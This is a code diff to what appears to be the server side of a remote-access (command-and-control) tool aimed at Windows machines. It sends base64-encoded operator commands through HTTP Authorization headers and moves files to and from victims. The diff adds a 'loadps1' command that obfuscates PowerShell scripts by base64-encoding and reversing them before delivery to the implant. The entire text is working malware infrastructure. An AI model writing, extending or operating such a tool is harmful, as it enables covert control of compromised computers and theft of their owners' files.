@@ -43,7 +43,7 @@ class myHandler(BaseHTTPRequestHandler):
         try:
             command = self.newCommand(pwd)
             self.sendCommand(command, html)
-        except BrokenPipeError:
+        except (AttributeError, BrokenPipeError) as e:
             pass
         return
 
@@ -59,7 +59,7 @@ class myHandler(BaseHTTPRequestHandler):
             try:
                 if (parser_type == "C0MM4ND"):
                     color = "white"
-                elif (parser_type == "UPL04D" or parser_type == "D0WNL04D"):
+                elif (parser_type == "UPL04D" or parser_type == "D0WNL04D" or parser_type == "L04DPS1"):
                     color = "green"
                 elif (parser_type == "3RR0R"):
                     color = "red"
@@ -145,11 +145,11 @@ class myHandler(BaseHTTPRequestHandler):
                     elif ('"' in command_list[1]):
                         filename = command.split('"')[1]
 
-                    content = functions.upload(filename)
-                    html = content.decode('utf-8')
+                    html = functions.upload(filename)
                 except (AttributeError, IndexError, UnboundLocalError) as e:
                     print (colored("\r\n[!] Source and/or destination file not found!", "red"))
                     print (colored("\t- Usage: upload /src/path/file C:\\dest\\path\\file\n", "red"))
+
             elif (command_list[0] == "download"):
                 try:
                     download = command_list[0]
@@ -158,6 +158,15 @@ class myHandler(BaseHTTPRequestHandler):
                 except IndexError:
                     print (colored("\r\n[!] Source and/or destination file not found!", "red"))
                     print (colored("\t- Usage: download C:\\src\\path\\file /dst/path/file\n", "red"))
+
+            elif (command_list[0] == "loadps1"):
+                functions = Functions()
+                try:
+                    filename = command_list[1]
+                    html = functions.loadps1(filename)
+                except IndexError:
+                    print (colored("\r\n[!] file not found!", "red"))
+                    print (colored("\t- Usage: load /path/to/file/to/load.ps1\n", "red"))
 
             CMD = base64.b64encode(command.encode())
             self.send_header('Authorization',CMD.decode('utf-8'))
@@ -168,9 +177,8 @@ class myHandler(BaseHTTPRequestHandler):
 class Functions():
     def upload(self, filename):
         try:
-            with open(filename, mode='rb') as file: # b is important -> binary
-                content = file.read()
-                return base64.b64encode(content)
+            with open(filename, mode='rb') as f: # b is important -> binary
+                return base64.b64encode(f.read()).decode('utf-8')
         except FileNotFoundError:
             print (colored("\r\n[!] Source file not found!", "red"))
 
@@ -182,6 +190,12 @@ class Functions():
                 print(colored(output, "green"))
         except:
             print (colored("\r\n[!] Error: Writing file!", "red"))
+    def loadps1(self, filename):
+        try:
+            with open(filename, "rb") as f:
+                return base64.b64encode(f.read()).decode()[::-1]
+        except FileNotFoundError:
+            print (colored("\r\n[!] File not found!", "red"))
 
 class Certificate():
     def checkCertificateExpiration(self):
